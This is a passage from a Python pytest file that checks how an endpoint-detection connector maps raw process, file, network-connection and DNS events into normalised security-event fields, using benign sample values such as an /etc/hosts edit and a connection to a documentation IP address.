    raw = F.process_event(action=action, syscall="", uid="", user_sid="S-1-5-21-1000-2000-3000-1001", integrity="High")
    n = _normalize("segark_edr.process_event", raw)
    assert (n["activity_id"], n["type_uid"]) == (activity, 100700 + activity)
    assert n["process"]["user"] == {"uid": "S-1-5-21-1000-2000-3000-1001"} and n["process"]["integrity"] == "High"
    assert "syscall" not in n["unmapped"]["segark_edr"]


def test_unknown_uid_is_left_out() -> None:
    n = _normalize("segark_edr.process_event", F.process_event(uid="4294967295"))
    assert "user" not in n["process"]


@pytest.mark.parametrize(
    "action,activity",
    [("create", 1), ("modify", 3), ("delete", 4), ("rename", 5), ("setattr", 6), ("open", 14), ("append", 14), ("link", 99), ("", 0)],
)
def test_file_actions(action: str, activity: int) -> None:
    n = _normalize("segark_edr.file_event", F.file_event(action))
    assert (n["class_uid"], n["activity_id"], n["type_uid"]) == (1001, activity, 100100 + activity)
    assert n["file"] == {"path": "/etc/hosts"} and n["count"] == 3
    assert n["actor"]["process"] == {"pid": 3100, "file": {"path": "/usr/bin/vim"}, "user": {"uid": "0"}}


def test_file_rename_keeps_the_result_path() -> None:
    n = _normalize("segark_edr.file_event", F.file_event("rename", dest_path="/etc/hosts.bak"))
    assert n["file_result"] == {"path": "/etc/hosts.bak"}
    assert "file_result" not in _normalize("segark_edr.file_event", F.file_event("modify"))


def test_outbound_connection_is_traffic_from_the_endpoint() -> None:
    n = _normalize("segark_edr.network_connection", F.network_event("out"))
    assert (n["class_uid"], n["category_uid"], n["activity_id"], n["type_uid"]) == (4001, 4, 6, 400106)
    assert n["connection_info"] == {"direction_id": 2, "direction": "Outbound", "protocol_name": "tcp", "protocol_num": 6}
    assert n["src_endpoint"] == {"port": 51514} and n["dst_endpoint"] == {"ip": "203.0.113.10", "port": 443}
    assert n["traffic"] == {"bytes_out": 1200, "bytes_in": 54000} and n["tls"] == {"sni": "www.example.com"}
    _no_nulls(n)


def test_inbound_connection_swaps_source_and_destination() -> None:
    n = _normalize("segark_edr.network_connection", F.network_event("in", sni="", protocol="udp"))
    assert n["connection_info"]["direction_id"] == 1 and n["connection_info"]["protocol_num"] == 17
    assert n["src_endpoint"] == {"ip": "203.0.113.10", "port": 443} and n["dst_endpoint"] == {"port": 51514}
    assert n["traffic"] == {"bytes_out": 54000, "bytes_in": 1200} and "tls" not in n
    _no_nulls(n)


def test_dns_query() -> None:
    n = _normalize("segark_edr.dns_event", F.dns_event())
    assert (n["class_uid"], n["category_uid"], n["activity_id"], n["type_uid"]) == (4003, 4, 1, 400301)
    assert n["query"] == {"hostname": "www.example.com", "type": "A"} and n["dst_endpoint"] == {"ip": "192.0.2.53"}
    assert {"query.hostname", "dst_endpoint.ip"} <= {o["name"] for o in n["observables"]}
    _no_nulls(n)


@pytest.mark.parametrize(
    "event_type,raw",
    [
        ("segark_edr.process_event", F.process_event()),
        ("segark_edr.file_event", F.file_event()),
        ("segark_edr.network_connection", F.network_event()),
        ("segark_edr.dns_event", F.dns_event()),
    ],
)
def test_telemetry_is_informational_on_the_device(event_type: str, raw: Dict[str, Any]) -> None:
    n = _normalize(event_type, raw)
    assert n["severity_id"] == 1
    assert n["device"]["uid"] == F.DEVICE and n["device"]["os"] == {"name": "Linux", "type_id": 200}
    assert n["metadata"]["version"] == "1.8.0"


def test_url_helper_matches_only_the_route() -> None:
    assert _match(_ALERTS).search(str(URL(_ALERTS).with_query({"from": "x"})))
    assert not _match(_ALERTS).search(_EVENTS)
